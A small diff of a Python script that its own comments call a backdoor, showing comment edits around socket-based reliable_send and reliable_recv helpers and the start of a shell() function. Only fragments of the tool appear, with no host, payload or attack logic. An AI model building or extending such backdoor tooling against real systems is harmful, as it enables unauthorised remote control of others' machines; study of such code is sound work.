@@ -10,7 +10,7 @@ def reliable_send(data):
     sock.send(json_data.encode())
 
 def reliable_recv():
-    # Pre
+    # Preparing to store json_data as bytes
     json_data = b''
     # To allow us run Backdoor until out of bytes
     # Instead of just 1024 bytes
@@ -23,7 +23,6 @@ def reliable_recv():
         except ValueError:
             # If we get ValueError
             # Will go over reliable_recv() over & over
-            # This will break the contents down to 1024 bytes each time
             continue
 
 def shell():
